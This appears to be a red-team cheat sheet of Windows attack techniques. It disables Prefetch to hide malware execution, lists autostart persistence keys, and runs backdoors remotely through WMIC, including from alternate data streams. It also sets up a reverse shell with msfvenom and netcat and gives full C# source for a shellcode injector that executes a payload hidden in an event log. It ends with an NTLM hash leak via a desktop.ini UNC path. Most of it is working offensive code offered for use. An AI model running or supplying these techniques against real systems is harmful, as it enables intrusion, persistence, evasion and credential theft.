The following command requires Administrator privileges, but disables Prefetch within the registry. While this tactic may appear anomalous to network defenders such as clearing Security Event Logs, it will obfuscate the malware's execution history.

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /f /d 0
```

## Windows AutoStart Persistence Locations

Locations for automatically starting at system boot or user logon

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
software\microsoft\windows\currentversion\run\microsoft windows html help
%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
```

## WMIC Tricks and Tips

Enumeration

```
wmic environment list
wmic useraccount get /ALL /format:csv
wmic process get caption,executablepath,commandline /format:csv
wmic qfe get description,installedOn /format:csv
# PowerShell
Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}
```

Lateral Movement

```
wmic /node:<IP> /user:administrator process call create "cmd.exe /c <backdoor>"
```

Uninstall Program

```
wmic /node:"#{node}" product where "name like '#{product}%%'" call uninstall
```

Execute a .EXE file stored as an Alternate Data Stream (ADS)

```
wmic.exe process call create "c:\ads\notsus.txt:malicious.exe"
```

Execute malicious.exe on a remote system

```
wmic.exe /node:"192.168.0.99" process call create "malicious.exe"
```

## Passive OS Detection and TCP Fingerprinting

![image](https://user-images.githubusercontent.com/72598486/216523402-aceea591-a143-4145-bdbc-f2b02027682e.png)

## Offline Microsoft Azure Active Directory Harvesting with PowerShell

This script demonstrates how to interact with Microsoft Azure Active Directory via PowerShell.  You will need an Azure AD account first, which is free: http://azure.microsoft.com/en-us/services/active-directory/

```
# Import the Azure AD PowerShell module:
Import-Module -Name Azure
# List the cmdlets provided by the module (750+):
Get-Command -Module Azure 
Add-AzureAccount
Get-AzureAccount
Get-AzureSubscription

# Import the Azure AD PowerShell module for MSOnline:
Import-Module -Name MSOnline
# List the cmdlets provided by the MSOnline module:
Get-Command -Module MSOnline

# Connect and authenticate to Azure AD, where your username will
# be similar to '<yourusername>@<yourdomain>.onmicrosoft.com':
$creds = Get-Credential
Connect-MsolService -Credential $creds


# Get subscriber company contact information:
Get-MsolCompanyInformation


# Get subscription and license information:
Get-MsolSubscription | Format-List *
Get-MsolAccountSku   | Format-List *


# Get Azure AD users:
Get-MsolUser


# Get list of Azure AD management roles:
Get-MsolRole


# Show the members of each management role:
Get-MsolRole | ForEach { "`n`n" ; "-" * 30 ; $_.Name ; "-" * 30 ; Get-MsolRoleMember -RoleObjectId $_.ObjectId | ForEach { $_.DisplayName } }
```

## PowerShell

Pull Windows Defender event logs 1116 (malware detected) and 1117 (malware blocked)
from a saved evtx file:

```
PS C:\> Get-WinEvent -FilterHashtable @{path="WindowsDefender.evtx";id=1116,1117}
```
Check for installed antivirus:

```
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

## Execute Payloads Utilizing Windows Event Logs

Create variable to contain payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<> LPORT=<> -f hex
```

```
$msf = '<Insert Shellcode as Hex Literal String'
```

Convert Payload variable to hex byte array:

```
$hashByteArray = [byte[]] ($payload -replace '..', '0x$&,' -split ',' -ne '')
```

Create new event log entry:

```
Write-Event -LogName 'Key Management Service' -Source KmsRequests -EventID 31337 -EventType Information -Category 0 -Message 'Here be Dragons' -RawData $HashByteArray
```

Start your listener:

```
nc -nvlp 1337
```

Execute code injector utilizing this code:

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace EventLogsForRedTeams
{
    class Program
    { 

    [DllImport("kernel32.dll")]
    public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect,
            out UInt32 lpflOldProtect);

    private delegate IntPtr ptrShellCode();
    static void Main(string[] args)
    {
        // Create a new EventLog object.
        EventLog theEventLog1 = new EventLog();

        theEventLog1.Log = "Key Management Service";

        // Obtain the Log Entries of the Event Log
        EventLogEntryCollection myEventLogEntryCollection = theEventLog1.Entries;

        byte[] data_array = myEventLogEntryCollection[0].Data;

        Console.WriteLine("*** Found Payload in " + theEventLog1.Log + " ***");
        Console.WriteLine("");
        Console.WriteLine("*** Injecting Payload ***");

        // inject the payload
        GCHandle SCHandle = GCHandle.Alloc(data_array, GCHandleType.Pinned);
        IntPtr SCPointer = SCHandle.AddrOfPinnedObject();
        uint flOldProtect;

        if (VirtualProtect(SCPointer, (UIntPtr)data_array.Length, 0x40, out flOldProtect))
        {
            ptrShellCode sc = (ptrShellCode)Marshal.GetDelegateForFunctionPointer(SCPointer, typeof(ptrShellCode));
            sc();
        }
    }
}
}
```

@BHIS
Source: https://github.com/roobixx/EventLogForRedTeams

## NTLM Leak via Desktop.ini

The desktop.ini files contain the information of the icons you have applied to the folder. We can abuse this to resolve a network path. Once you open the folder you should get the hashes.

```sh
mkdir openMe
attrib +s openMe
cd openMe
echo [.ShellClassInfo] > desktop.ini
echo IconResource=\\192.168.0.1\aa >> desktop.ini
attrib +s +h desktop.ini
```
